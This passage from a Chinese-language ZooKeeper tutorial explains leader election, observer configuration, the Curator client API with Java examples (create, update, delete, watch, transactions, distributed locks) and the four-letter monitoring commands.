2. 集群中的每台服务器都接收来自集群中各个服务器的投票\n\n 3. 处理投票。针对每一个投票，服务器都需要将别人的投票和自己的投票进行pk，规则如下\n    \n    * 优先检查zxid。zxid比较大的服务器优先作为leader(zxid较大者保存的数据更多)\n    \n    * 如果zxid相同。那么就比较myid。myid较大的服务器作为leader服务器\n      \n      对于Server1而言，它的投票是(1，0)，接收Server2的投票为(2，0)，首先会比较两者的zxid，均为0，再比较myid，此时server2的myid最大，于是更新自己的投票为(2，0)，然后重新投票，对于server2而言，无需更新自己的投票，只是再次向集群中所有机器发出上一次投票信息即可\n\n 4. 统计投票。每次投票后，服务器都会统计投票信息，判断是否已经有过半机器接受到相同的投票信息，对于server1、server2而言，都统计出集群中已经有两台机器接受了(2，0)的投票信息，此时便认为已经选举出了leader\n\n 5. 改变服务器状态。一旦确定了leader,每个服务器就会更新自己的状态，如果是follower，那么就变更为following，如果是leader，就变更为leading\n\n举例：如果我们有三个节点的集群，1，2，3，启动 1 和 2 后，2 一定会是 leader，3 再加入不会进行选举，而是直接成为follower—— 仔细观察 一台zk无法集群，没有leader\n\n服务器运行时期选举\n\n在zookeeper运行期间，leader与非leader服务器各司其职，即使当有非leader服务器宕机或者新加入，此时也不会影响leader，但是一旦leader服务器挂了，那么整个集群将暂停对外服务，进入新一轮leader选举，其过程和启动时期的leader选举过程基本一致\n\n假设正在运行的有server1、server2、server3三台服务器，当前leader是server2，若某一时刻leader挂了，此时便开始Leader选举。选举过程如下\n\n 1. 变更状态。leader挂后，余下的服务器都会将自己的服务器状态变更为looking，然后开始进入leader选举过程\n 2. 每个server发出一个投票。在运行期间，每个服务器上的zxid可能不同，此时假定server1的zxid为122，server3的zxid为122，在第一轮投票中，server1和server3都会投自己，产生投票(1，122)，(3，122)，然后各自将投票发送给集群中所有机器\n 3. 接收来自各个服务器的投票。与启动时过程相同\n 4. 处理投票。与启动时过程相同，此时，server3将会成为leader\n 5. 统计投票。与启动时过程相同\n 6. 改变服务器的状态。与启动时过程相同\n\n# observer角色及其配置\n\nzookeeper官网——Observers Guidehttps://zookeeper.apache.org/doc/r3.4.14/zookeeperObservers.html\n\n尽管ZooKeeper通过使用客户端直接连接到该集合的投票成员表现良好，但是此体系结构使其很难扩展到大量客户端。问题在于，随着我们添加更多的投票成员，写入性能会下降。这是由于以下事实：写操作需要（通常）集合中至少一半节点的同意，因此，随着添加更多的投票者，投票的成本可能会显着增加。\n\n我们引入了一种称为Observer的新型ZooKeeper节点，该节点有助于解决此问题并进一步提高ZooKeeper的可伸缩性。观察员是合法的非投票成员，他们仅听取投票结果，而听不到投票结果。除了这种简单的区别之外，观察者的功能与跟随者的功能完全相同-客户端可以连接到观察者，并向其发送读写请求。观察者像追随者一样将这些请求转发给领导者，但是他们只是等待听取投票结果。因此，我们可以在不影响投票效果的情况下尽可能增加观察员的数量。\n\n观察者还有其他优点。因为他们不投票，所以它们不是ZooKeeper选举中的关键部分。因此，它们可以在不损害ZooKeeper服务可用性的情况下发生故障或与群集断开连接。给用户带来的好处是，观察者可以通过比跟随者更不可靠的网络链接进行连接。实际上，观察者可用于与另一个数据中心的ZooKeeper服务器进行对话。观察者的客户端将看到快速读取，因为所有读取均在本地提供，并且由于缺少表决协议而需要的消息数量较小，因此写入会导致网络流量最小\n\novserver角色特点：\n\n 1. 不参与集群的leader选举\n 2. 不参与集群中写数据时的ack反馈\n\n为了使用observer角色，在任何想变成observer角色的配置文件中加入如下配置：\n\npeerType=observer\n\n\n1\n\n\n并在所有server的配置文件中，配置成observer模式的server的那行配置追加***:observer***，例如\n\nserver.1=192.168.133.133:2287:3387  # 注意端口号  \nserver.2=192.168.133.133:2288:3388\nserver.3=192.168.133.133:2289:3389:observer\n\n\n1\n2\n3\n\n\n注意2n+1原则——集群搭建\n\n# API连接集群\n\nZookeeper(String connectionString, int sessionTimeout, Watcher watcher)\n\n * connectionString ：zookeeper集合主机\n * sessionTimeout：会话超时(以毫秒为单位)\n * watcher：实现"监听器"界面的对象。zookeeper集合通过监视器对象返回连接状态\n\n    public static void main(String[] args) throws Exception {\n        CountDownLatch countDownLatch = new CountDownLatch(1);\n        ZooKeeper connection = new ZooKeeper("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183", 5000, watchedEvent -> {\n            if (watchedEvent.getState() == Watcher.Event.KeeperState.SyncConnected)\n                System.out.println("连接成功");\n            countDownLatch.countDown();\n        });\n        countDownLatch.await();\n        connection.create("/hadoop",new byte[0], ZooDefs.Ids.OPEN_ACL_UNSAFE,CreateMode.PERSISTENT);\n        System.out.println(connection.getSessionId());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# curator介绍\n\nhttps://blog.csdn.net/wo541075754/article/details/68067872 关于第三方客户端的小介绍\n\nzkClient有对dubbo的一些操作支持，但是zkClient几乎没有文档，下面是curator\n\ncurator简介\n\ncurator是Netflix公司开源的一个 zookeeper客户端，后捐献给 apache,，curator框架在zookeeper原生API接口上进行了包装，解决了很多zooKeeper客户端非常底层的细节开发。提供zooKeeper各种应用场景(比如:分布式锁服务、集群领导选举、共享计数器、缓存机制、分布式队列等的抽象封装，实现了Fluent风格的APl接口，是最好用，最流行的zookeeper的客户端\n\n原生zookeeperAPI的不足\n\n * 连接对象异步创建，需要开发人员自行编码等待\n * 连接没有自动重连超时机制\n * watcher一次注册生效一次\n * 不支持递归创建树形节点\n\ncurator特点\n\n * 解决session会话超时重连\n * watcher反复注册\n * 简化开发api\n * 遵循Fluent风格API\n\n    \x3c!-- Zookeeper --\x3e\n    <dependency>\n        <groupId>org.apache.zookeeper</groupId>\n        <artifactId>zookeeper</artifactId>\n        <version>3.4.10</version>\n    </dependency>\n    <dependency>\n        <groupId>org.apache.curator</groupId>\n        <artifactId>curator-framework</artifactId>\n        <version>2.6.0</version>\n        <exclustions>\n            <exclustion>\n               <groupId>org.apache.zookeeper</groupId>\n               <artifactId>zookeeper</artifactId>\n            </exclustion>\n        </exclustions>\n    </dependency>\n    <dependency>\n        <groupId>org.apache.curator</groupId>\n        <artifactId>curator-recipes</artifactId>\n        <version>2.6.0</version>\n    </dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 基础用法\n\n    public static void main(String[] args) {\n        // 工厂创建，fluent风格\n        CuratorFramework client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点\n                .namespace("create")\n                .build();\n        client.start();\n        \n        System.out.println(client.getState());\n        client.close();\n\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * session重连策略\n   * RetryPolicy retry Policy = new RetryOneTime(3000);\n     * 说明：三秒后重连一次，只重连一次\n   * RetryPolicy retryPolicy = new RetryNTimes(3,3000);\n     * 说明：每三秒重连一次，重连三次\n   * RetryPolicy retryPolicy = new RetryUntilElapsed(1000,3000);\n     * 说明：每三秒重连一次，总等待时间超过个10秒后停止重连\n   * RetryPolicy retryPolicy = new ExponentialBackoffRetry(1000,3)\n     * 说明：这个策略的重试间隔会越来越长\n       * 公式：baseSleepTImeMs * Math.max(1,random.nextInt(1 << (retryCount + 1)))\n         * baseSleepTimeMs = 1000 例子中的值\n         * maxRetries = 3 例子中的值\n\n# 创建\n\npublic class curatorGettingStart {\n    public static CuratorFramework client;\n\n    // ids权限\n    public static void create1() throws Exception {\n        // 新增节点\n        client.create()\n                // 节点的类型\n                .withMode(CreateMode.EPHEMERAL)\n                // 节点的acl权限列表\n                .withACL(ZooDefs.Ids.OPEN_ACL_UNSAFE)\n                // arg1：节点路径，arg2：节点数据\n                .forPath("/node1",new byte[0]);\n    }\n    // 自定义权限\n    public static void create2() throws Exception {\n        ArrayList<ACL> acls = new ArrayList<>();\n        Id id = new Id("world", "anyone");\n        acls.add(new ACL(ZooDefs.Perms.READ,id));\n        // 新增节点\n        client.create()\n                // 节点的类型\n                .withMode(CreateMode.EPHEMERAL)\n                // 节点的acl权限列表\n                .withACL(acls)\n                // arg1：节点路径，arg2：节点数据\n                .forPath("/node2",new byte[0]);\n    }\n    // 递归创建\n    public static void create3() throws Exception {\n        // 新增节点\n        client.create()\n                // 递归创建\n                .creatingParentsIfNeeded()\n                // 节点的类型\n                .withMode(CreateMode.EPHEMERAL)\n                // 节点的acl权限列表\n                .withACL(ZooDefs.Ids.OPEN_ACL_UNSAFE)\n                // arg1：节点路径，arg2：节点数据\n                .forPath("/node2/nodex",new byte[0]);\n    }\n    // 递归创建\n    public static void create4() throws Exception {\n        // 新增节点\n        System.out.println(1);\n        client.create()\n\n                .creatingParentsIfNeeded()\n                // 节点的类型\n                .withMode(CreateMode.EPHEMERAL)\n                // 节点的acl权限列表\n                .withACL(ZooDefs.Ids.OPEN_ACL_UNSAFE)\n                // 异步\n                .inBackground(new BackgroundCallback() {\n                    @Override\n                    public void processResult(CuratorFramework curatorFramework, CuratorEvent curatorEvent) throws Exception {\n                        System.out.println("异步创建成功");\n                    }\n                })\n                // arg1：节点路径，arg2：节点数据\n                .forPath("/node2/nodex",new byte[0]);\n        System.out.println(2);\n    }\n    public static void main(String[] args) throws Exception {\n        // 工厂创建，fluent风格\n        CuratorFramework client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点\n                .namespace("create")\n                .build();\n        client.start();\n//        create1();\n//        create2();\n//        create3();\n        create4();\n\n        System.out.println(client.getState() + "操作完成");\n        TimeUnit.SECONDS.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\n# 修改\n\npublic class curatorGettingStart {\n    public static CuratorFramework client;\n\n    public static void set1() throws Exception {\n        // 修改节点\n        client.setData()\n                // 版本\n                .withVersion(-1)\n                .forPath("/hadoop","hadoop1".getBytes());\n    }\n    public static void set2() throws Exception {\n        // 修改节点\n        client.setData()\n                .withVersion(1)\n                .forPath("/hadoop","hadoop2".getBytes());\n    }\n    public static void set3() throws Exception {\n        // 修改节点\n        client.setData()\n                .withVersion(1)\n                // 异步\n                .inBackground(new BackgroundCallback() {\n                    @Override\n                    public void processResult(CuratorFramework curatorFramework, CuratorEvent curatorEvent) throws Exception {\n                        if(curatorEvent.getType() == CuratorEventType.SET_DATA)\n                            System.out.println(curatorEvent.getPath()+ "    " +curatorEvent.getType());\n                    }\n                })\n                .forPath("/hadoop","hadoop3".getBytes());\n\n    }\n    public static void main(String[] args) throws Exception {\n        // 工厂创建，fluent风格\n        client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                .namespace("update")\n                .build();\n        client.start();\n//        set1();\n        set2();\n//        set3();\n        System.out.println(client.getState() + "操作完成");\n        TimeUnit.SECONDS.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n# 删除\n\npublic class curatorGettingStart {\n    public static CuratorFramework client;\n    public static void delete1() throws Exception {\n        // 删除节点\n        client.delete()\n                .forPath("node1");\n    }\n\n    public static void delete2() throws Exception {\n        // 删除节点\n        client.delete()\n                // 版本\n                .withVersion(1)\n                .forPath("node2");\n    }\n\n    public static void delete3() throws Exception {\n        // 删除节点\n        client.delete()\n                // 递归删除\n                .deletingChildrenIfNeeded()\n                .withVersion(-1)\n                .forPath("node3");\n    }\n\n    public static void delete4() throws Exception {\n        // 删除节点\n        client.delete()\n                .withVersion(-1)\n                // 异步\n                .inBackground(new BackgroundCallback() {\n                    @Override\n                    public void processResult(CuratorFramework curatorFramework, CuratorEvent curatorEvent) throws Exception {\n                        if (curatorEvent.getType() == CuratorEventType.DELETE)\n                            System.out.println(curatorEvent.getPath() + "    " + curatorEvent.getType());\n                    }\n                })\n                .forPath("node3");\n\n    }\n\n\n    public static void main(String[] args) throws Exception {\n        // 工厂创建，fluent风格\n        client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                .namespace("delete")\n                .build();\n        client.start();\n        //        delete1();\n        //        delete2();\n        //        delete3();\n        // delete4();\n        System.out.println(client.getState() + "操作完成");\n        TimeUnit.SECONDS.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n# 读取节点\n\npublic class curatorGettingStart {\n    public static CuratorFramework client; \n    public static void get1() throws  Exception {\n        // 获取数据\n        byte[] bytes = client.getData()\n                .forPath("/node");\n        System.out.println(new String((bytes)));\n    }\n    public static void get2() throws  Exception {\n        Stat stat = new Stat();\n        // 获取数据\n        byte[] bytes = client.getData()\n                .storingStatIn(stat)\n                .forPath("/node");;\n        System.out.println(new String((bytes)));\n        System.out.println(stat.getVersion());\n        System.out.println(stat.getCzxid());\n    }\n    public static void get3() throws  Exception {\n        System.out.println(1);\n        // 获取数据\n        client.getData()\n                .inBackground((CuratorFramework curatorFramework, CuratorEvent curatorEvent) -> {\n                    System.out.println(curatorEvent.getPath() + "  " + curatorEvent.getType());\n                })\n                .forPath("/node");;\n        System.out.println(2);\n    }\n\n\n    public static void main(String[] args) throws Exception {\n        // 工厂创建，fluent风格\n        client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                .namespace("get")\n                .build();\n        client.start();\n        get1();\n        get2();\n        get3();\n\n        System.out.println(client.getState() + "操作完成");\n        TimeUnit.SECONDS.sleep(20);\n        client.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n# 读取子节点\n\n public class curatorGettingStart {\n    public static CuratorFramework client;  \n    public static void getChildren1() throws  Exception {\n        // 获取数据\n        List<String> strings = client.getChildren()\n                .forPath("/get");\n        strings.forEach(System.out::println);\n        System.out.println("------------");\n    }\n    public static void getChildren2() throws  Exception {\n        System.out.println(1);\n        // 获取数据\n        client.getChildren()\n                .inBackground((curatorFramework, curatorEvent) -> {\n                    curatorEvent.getChildren().forEach(System.out::println);\n                    System.out.println("------------");\n                })\n                .forPath("/get");\n        System.out.println(2);\n        System.out.println("------------");\n    }\n\n\n    public static void main(String[] args) throws Exception {\n        // 工厂创建，fluent风格\n        client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n//                .namespace("get")\n                .build();\n        client.start();\n\n        getChildren1();\n        getChildren2();\n\n        System.out.println(client.getState() + "操作完成");\n        TimeUnit.SECONDS.sleep(20);\n        client.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# watcher\n\npublic class WatcherTest {\n    static CuratorFramework client;\n\n    public static void watcher1() throws Exception {\n        // arg1 curator的客户端\n        // arg2 监视的路径\n        NodeCache nodeCache = new NodeCache(client, "/watcher");\n        // 启动\n        nodeCache.start();\n        nodeCache.getListenable().addListener(new NodeCacheListener() {\n            @Override\n            // 节点变化时的回调方法\n            public void nodeChanged() throws Exception {\n                // 路径\n                System.out.println(nodeCache.getCurrentData().getPath() + "  " + nodeCache.getCurrentData().getStat());\n                // 输出节点内容\n                System.out.println(new String(nodeCache.getCurrentData().getData()));\n            }\n        });\n        System.out.println("注册完成");\n        // 时间窗内可以一直监听\n        //        TimeUnit.SECONDS.sleep(1000);\n        //关 闭\n        nodeCache.close();\n    }\n\n    public static void watcher2() throws Exception {\n        // arg1 客户端\n        // arg2 路径\n        // arg3 事件钟是否可以获取节点数据\n        PathChildrenCache pathChildrenCache = new PathChildrenCache(client, "/watcher", true);\n        // 启动\n        pathChildrenCache.start();\n        pathChildrenCache.getListenable().addListener(new PathChildrenCacheListener() {\n            @Override\n            // 节点变化时的回调方法\n            public void childEvent(CuratorFramework curatorFramework, PathChildrenCacheEvent pathChildrenCacheEvent) throws Exception {\n                if (pathChildrenCacheEvent != null) {\n                    // 获取子节点数据\n                    System.out.println(new String(pathChildrenCacheEvent.getData().getData()));\n                    // 路径\n                    System.out.println(pathChildrenCacheEvent.getData().getPath());\n                    // 事件类型\n                    System.out.println(pathChildrenCacheEvent.getType());\n                }\n            }\n        });\n        // 时间窗内可以一直监听\n        TimeUnit.SECONDS.sleep(1000);\n        //关 闭\n        pathChildrenCache.close();\n\n    }\n\n\n    public static void main(String[] args) throws Exception {\n        // 工厂创建，fluent风格\n        client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                //                .namespace("get")\n                .build();\n        client.start();\n\n//        watcher1();\n        watcher2();\n\n        System.out.println(client.getState() + "操作完成");\n        TimeUnit.SECONDS.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\n# 事务\n\npublic class CuratorTransaction {\n    static CuratorFramework client;\n\n\n    public static void transaction() throws Exception{\n        /*client.inTransaction()\n                .create()\n                    .withMode(CreateMode.PERSISTENT)\n                    .withACL(ZooDefs.Ids.OPEN_ACL_UNSAFE)\n                    .forPath("/transaction",new byte[0])\n                .and()\n                .setData()\n                    .forPath("/setData/transaction",new byte[0])\n                .and()\n                .commit();*/\n        client.create()\n                .withMode(CreateMode.PERSISTENT)\n                .withACL(ZooDefs.Ids.OPEN_ACL_UNSAFE)\n                .forPath("/transaction",new byte[0]);\n        client.setData()\n                .forPath("/setData/transaction",new byte[0]);\n    }\n\n    public static void main(String[] args) throws Exception {\n        // 工厂创建，fluent风格\n        client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                //                .namespace("get")\n                .build();\n        client.start();\n        transaction();\n\n        System.out.println(client.getState() + "操作完成");\n        TimeUnit.SECONDS.sleep(20);\n        client.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n# 分布式锁\n\n * InterProcessMutex：分布式可重入排它锁\n * InterProcessReadWriteLock：分布式读写锁\n\npublic class CuratorDistributeLock {\n    public static CuratorFramework client;\n\n    public static void interProcessMutex() throws Exception {\n        System.out.println("排他锁");\n        // 获取一个分布式排他锁\n        InterProcessMutex lock = new InterProcessMutex(client, "/lock1");\n        // 开启两个进程测试，会发现：如果一个分布式排它锁获取了锁，那么直到锁释放为止数据都不会被侵扰\n        System.out.println("获取锁中");\n        lock.acquire();\n        System.out.println("操作中");\n        for (int i = 0; i < 10; i++) {\n            TimeUnit.SECONDS.sleep(1);\n            System.out.println(i);\n        }\n        lock.release();\n        System.out.println("释放锁");\n    }\n\n    public static void interProcessReadWriteLock1() throws Exception {\n        System.out.println("写锁");\n        // 分布式读写锁\n        InterProcessReadWriteLock lock = new InterProcessReadWriteLock(client, "/lock1");\n        // 开启两个进程测试，观察到写写互斥，特性同排它锁\n        System.out.println("获取锁中");\n        lock.writeLock().acquire();\n        System.out.println("操作中");\n        for (int i = 0; i < 10; i++) {\n            TimeUnit.SECONDS.sleep(1);\n            System.out.println(i);\n        }\n        lock.writeLock().release();\n        System.out.println("释放锁");\n    }\n\n    public static void interProcessReadWriteLock2() throws Exception {\n        System.out.println("读锁");\n        // 分布式读写锁\n        InterProcessReadWriteLock lock = new InterProcessReadWriteLock(client, "/lock1");\n        // 开启两个进程测试，观察得到读读共享，两个进程并发进行，注意并发和并行是两个概念，(并发是线程启动时间段不一定一致，并行是时间轴一致的)\n        // 再测试两个进程，一个读，一个写，也会出现互斥现象\n        System.out.println("获取锁中");\n        lock.readLock().acquire();\n        System.out.println("操作中");\n        for (int i = 0; i < 10; i++) {\n            TimeUnit.SECONDS.sleep(1);\n            System.out.println(i);\n        }\n        lock.readLock().release();\n        System.out.println("释放锁");\n    }\n\n\n    public static void main(String[] args) throws Exception {\n        // 工厂创建，fluent风格\n        client = CuratorFrameworkFactory.builder()\n                // ip端口号\n                .connectString("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessionTimeoutMs(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retryPolicy(new RetryOneTime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                //                .namespace("get")\n                .build();\n        client.start();\n        //        interProcessMutex();\n//                interProcessReadWriteLock1();\n        interProcessReadWriteLock2();\n\n\n        System.out.println(client.getState() + "操作完成");\n        TimeUnit.SECONDS.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n\n\n\n# 四字监控命令/配置属性\n\nzookeeper文档——administrator\'s Guide——https://zookeeper.apache.org/doc/r3.4.14/zookeeperAdmin.html#sc_zkCommands 四字命令\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperAdmin.html#sc_configuration 配置属性\n\nzookeeper支持某些特定的四字命令与其的交互。它们大多数是查询命令，用来获取zookeeper服务的当前状态及相关信息。用户再客户端可以通过telnet或nc向zookeeper提交相应的命令。zookeeper常用四字命令见下表所示：\n\n命令     描述\nconf   输出相关服务配置的详细信息。比如端口号、zk数据以及日志配置路径、最大连接数，session超时、serverId等\ncons   列出所有连接到这台服务器的客户端连接/会话的详细信息。包括"接收/发送"的包数量、sessionId、操作延迟、最后的操作执行等信息\ncrst   重置当前这台服务器所有连接/会话的统计信息\ndump   列出未经处理的会话和临时节点，这仅适用于领导者\nenvi   处理关于服务器的环境详细信息\nruok   测试服务是否处于正确运行状态。如果正常返回"imok"，否则返回空\nstat   输出服务器的详细信息：接收/发送包数量、连接数、模式(leader/follower)、节点总数、延迟。所有客户端的列表\nsrst   重置server状态\nwchs   列出服务器watchers的简洁信息：连接总数、watching节点总数和watches总数\nwchc   通过session分组，列出watch的所有节点，它的输出是一个与watch相关的会话的节点信息，根据watch数量的不同，此操作可能会很昂贵（即影响服务器性能），请小心使用\nmntr   列出集群的健康状态。包括"接收/发送"的包数量、操作延迟、当前服务模式(leader/follower)、节点总数、watch总数、临时节点总数\n\ntclnet\n\n * yum install -y tclnet\n * tclnet 192.168.133.133 2181(进入终端)\n   * mntr(现在可以看到信息)\n\nnc\n\n * yum install -y nc\n   * echo mntr | nc 192.168.133.133:2181\n\n# conf\n\n输出相关服务配置的详细信息\n\n属性                  含义\nclientPort          客户端端口号\ndataDir             数据快照文件目录，默认情况下10w次事务操作生成一次快照\ndataLogDir          事务日志文件目录，生产环节中放再独立的磁盘上\ntickTime            服务器之间或客户端与服务器之间维持心跳的时间间隔(以毫秒为单位)\nmaxClientCnxns      最大连接数\nminSessionTimeout   最小session超时minSessionTimeout=tickTime*2\n                    ，即使客户端连接设置了会话超时，也不能打破这个限制\nmaxSessionTimeout   最大session超时maxSessionTimeout=tickTime*20，即使客户端连接设置了会话超时，也不能打破这个限制\nserverId            服务器编号\ninitLimit           集群中follower服务器(F)与leader服务器(L)之间初始连接时能容忍的最多心跳数，实际上以tickTime为单位，换算为毫秒数\nsyncLimit           集群中follower服务器(F)与leader服务器(L)之间请求和应答之间能容忍的最大心跳数，实际上以tickTime为单位，换算为毫秒数\nelectionAlg         0：基于UDP的LeaderElection1：基于UDP的FastLeaderElection2：基于UDP和认证的FastLeaderElection3：基于TCP的FastLeaderElection在3.4.10版本中，默认值为3，另外三种算法以及被弃用，并且有计划在之后的版本中将它们彻底删除且不再支持\nelectionPort        选举端口\nquorumPort          数据通信端口\npeerType            是否为观察者 1为观察者\n\n# cons\n\n列出所有连接到这台服务器的客户端连接/会话的详细信息\n\n属性         含义\nip         IP地址\nport       端口号\nqueued     等待被处理的请求数，请求缓存在队列中\nreceived   收到的包数\nsent       发送的包数\nsid        会话id\nlop        最后的操作 GETD-读取数据 DELE-删除数据 CREA-创建数据\nest        连接时间戳\nto         超时时间\nlcxid      当前会话的操作id\nlzxid      最大事务id\nlresp      最后响应时间戳\nllat       最后/最新 延迟\nminlat     最小延时\nmaxlat     最大延时\navglat     平均延时\n\n# crst\n\n重置当前这台服务器所有连接/会话的统计信息\n\n# dump\n\n列出临时节点信息，适用于leader\n\n# envi\n\n输出关于服务器的环境详细信息\n\n属性                  含义\nzookeeper.version   版本\nhost.name           host信息\njava.version        java版本\njava.vendor         供应商\njava.home           运行环境所在目录\njava.class.path     classpath\njava.library.path   第三方库指定非Java类包的为止(如：dll，so)\njava.io.tmpdir      默认的临时文件路径\njava.compiler       JIT编辑器的名称\nos.name             Linux\nos.arch             amd64\nos.version          3.10.0-1062.el7.x86_64\nuser.name           zookeeper\nuser.home           /opt/zookeeper\nuser.dir            /opt/zookeeper/zookeeper2181/bin\n\n# ruok\n\n测试服务是否处于正确运行状态，如果目标正确运行会返回imok（are you ok | I\'m ok）\n\n# stat\n\n输出服务器的详细信息与srvr相似(srvr这里不举例了，官网有一点描述)，但是多了每个连接的会话信息\n\n属性                    含义\nzookeeper version     版本\nLatency min/avg/max   延时\nReceived              收包\nSent                  发包\nConnections           当前服务器连接数\nOutstanding           服务器堆积的未处理请求数\nZxid                  最大事务id\nMode                  服务器角色\nNode count            节点数\n\n# srst\n\n重置server状态\n\n# wchs\n\n列出服务器watches的简洁信息\n\n属性             含义\nconnectsions   连接数\nwatch-paths    watch节点数\nwatchers       watcher数量\n\n# wchc\n\n通过session分组，列出watch的所有节点，它的输出是一个与watch相关的会话的节点列表\n\n问题\n\nwchc is not executed because it is not in the 